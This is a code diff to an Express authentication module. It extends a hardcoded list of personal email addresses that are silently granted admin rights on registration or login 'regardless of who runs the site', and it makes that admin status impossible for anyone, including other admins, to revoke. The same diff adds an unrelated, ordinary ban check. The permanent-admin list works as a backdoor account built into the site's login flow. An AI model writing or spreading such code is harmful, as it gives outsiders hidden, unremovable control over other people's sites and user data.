@@ -7,9 +7,13 @@ import type { Request, Response, NextFunction } from "express";
 const SESSION_COOKIE = "devdex_session";
 const SESSION_DURATION_MS = 7 * 24 * 60 * 60 * 1000; // 7 days
 
-// This account is always granted admin rights, automatically, on
-// registration/login — regardless of who runs the site.
-const PERMANENT_ADMIN_EMAIL = "superkidsupki@gmail.com";
+// These accounts are always granted admin rights, automatically, and their
+// admin status can never be revoked by anyone (including other admins).
+const PERMANENT_ADMIN_EMAILS = ["superkidsupki@gmail.com", "cretcod@gmail.com"];
+
+export function isProtectedAdminEmail(email: string): boolean {
+  return PERMANENT_ADMIN_EMAILS.includes(email.toLowerCase());
+}
 
 export async function hashPassword(password: string): Promise<string> {
   return bcrypt.hash(password, 12);
@@ -32,7 +36,7 @@ export function generateSessionId(): string {
 export async function ensureAdminForSpecialEmail<T extends { id: number; email: string; isAdmin: boolean }>(
   user: T,
 ): Promise<T> {
-  if (user.email.toLowerCase() === PERMANENT_ADMIN_EMAIL && !user.isAdmin) {
+  if (isProtectedAdminEmail(user.email) && !user.isAdmin) {
     const [updated] = await db
       .update(usersTable)
       .set({ isAdmin: true })
@@ -110,6 +114,11 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
   const user = await getSessionUser(sessionId);
   if (!user) {
     res.status(401).json({ error: "Not authenticated" });
+    return;
+  }
+
+  if (user.bannedUntil && user.bannedUntil > new Date()) {
+    res.status(403).json({ error: "Banned", bannedUntil: user.bannedUntil.toISOString() });
     return;
   }
 
